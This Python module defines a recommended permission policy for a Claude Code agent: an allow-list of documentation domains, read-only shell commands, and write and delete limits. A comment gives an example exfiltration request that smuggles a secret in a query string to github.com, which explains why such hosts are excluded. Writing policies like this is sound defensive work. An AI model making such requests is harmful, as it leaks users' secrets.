"""The recommended mandate form for a Claude Code agent (`deus-witness-hook --print-form`): plain data, the same lists the Mandate page
shows (web/js/mandate_form.js) and the server's preset (server/app/toolmap.py CC_READONLY_COMMANDS); a test keeps them equal."""
from __future__ import annotations

import os
import tempfile

# Default WebFetch allow-list of the recommended mandate (message.domains): documentation and package indexes only.
# 0.2.22: NO host where anyone can publish content (github.com, raw.githubusercontent.com, gist.github.com, gist.githubusercontent.com,
# pastebins, ...): a GET with a query string to such a host is a way out for stolen data (a mandate that allows github.com allows
# `WebFetch https://github.com/x?q=<secret>`). Read-only documentation hosts stay (the agent can still read docs offline-free), plus
# localhost for local dev servers. Needs github.com for a project? Add it deliberately on the Mandate page (a signed, visible choice).
# docs.github.com is kept: it is GitHub's own documentation, nobody can publish on it. Same list as the server's (a test keeps them equal).
DEFAULT_WEB_DOMAINS = ["localhost", "127.0.0.1", "docs.python.org", "pypi.org", "docs.github.com",
                       "developer.mozilla.org", "www.npmjs.com", "nodejs.org", "docs.anthropic.com", "code.claude.com"]

# Default read-only commands of the recommended mandate (command.allow), 0.2.9: modelled on Claude Code's own read-only set.
# A listed name covers only the plain form of the command (the witness names other forms differently and asks). Same list: the server's
# preset and the Mandate page (a test keeps them equal). The owner-facing summary is docs/coverage-public.md.
DEFAULT_SAFE_COMMANDS = ["ls", "pwd", "cd", "cat", "head", "tail", "wc", "echo", "grep", "rg", "which", "file", "stat", "du", "df", "date", "uname",
                         "git status", "git log", "git diff", "git show", "git branch"]


def default_form(project_dir: str, web_domains=None, safe_commands=None) -> dict:
    """Recommended mandate form for a Claude Code agent (the 'default rules'):
      - writes (Write/Edit/NotebookEdit/Bash redirections) only inside the project and the temp dir; elsewhere deny RESOURCE;
      - shell commands: the listed read-only commands run, any other is asked, a dangerous one is always asked; reading a credential
        file is asked;
      - WebFetch only to the listed domains; elsewhere deny RECIPIENT;
      - no purchases."""
    proj = os.path.realpath(project_dir)
    tmp = os.path.realpath(tempfile.gettempdir())
    return {"currency": "USD", "valid_days": 30, "purchase": None,
            "message": {"domains": list(DEFAULT_WEB_DOMAINS if web_domains is None else web_domains), "to": []},
            "forbidden_data": [], "publish": None,
            "delete": {"targets": [proj + "/*", tmp + "/*"], "allow_irreversible": True},
            "command": {"allow": list(DEFAULT_SAFE_COMMANDS if safe_commands is None else safe_commands), "unlisted": "ask"}}
